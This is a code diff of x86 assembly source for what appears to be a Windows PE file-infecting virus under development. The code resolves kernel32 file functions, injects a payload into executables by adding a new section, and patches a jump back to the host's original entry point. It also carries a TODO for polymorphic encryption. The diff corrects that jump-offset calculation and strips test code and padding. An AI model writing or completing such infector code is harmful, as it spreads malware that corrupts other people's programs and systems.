@@ -105,7 +105,6 @@ pFindNextFile	dd	?
 
 ; TODO
 ; Seek TODO
-; Jmp to old entry point after injecting
 ; Polymorphism : Create decrypter, copy it, copy opcode encrypted (Add this to the size ?)
 
 start:
@@ -174,12 +173,6 @@ GETADDR	sCloseHandle, pKernel32, pCloseHandle
 GETADDR	sWriteFile, pKernel32, pWriteFile
 GETADDR	sFindFirstFile, pKernel32, pFindFirstFile
 GETADDR	sFindNextFile, pKernel32, pFindNextFile
-; Test!
-push	0
-PDELTA	sHelloWorld
-PDELTA	sHelloWorld
-push	0
-call	[DELTA pMessageBox]
 
 
 ; INJECT ALL THE FILES !
@@ -444,14 +437,14 @@ loop	createNewSection
 mov	edi, errorExit - toInject ; Offset jmp
 add	edi, [DELTA PeFileMap] ; Add base filemap
 add	edi, [DELTA PointerToRawData] ; Add section offset
-add	edi, 11
+; add	edi, 11
 mov	eax, 0E9h ; Push imm32 OPCODE
 stosb
 mov	eax, [DELTA OldEntryPoint] ; Entry point address
 sub	eax, [DELTA VirtualAddress]
 mov	edx, errorExit - toInject
 sub	eax, edx
-sub	eax, 010h
+sub	eax, 05h ; Add 5 bytes for JMP
 stosd
 
 ; DEBUG FILE INJECTED - TODO REMOVE
@@ -518,12 +511,6 @@ match:
 xor	eax, eax
 nomatch:
 ret
-
-
-; TODO: Because endInject - toInject is NOT WORKING (There is like 10bytes missing when INSERTING OPCODES)
-SomePadding	db	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",0
-MorePadding	db	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",0
-ISAIDMORE	db	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",0
 
 endInject:
 
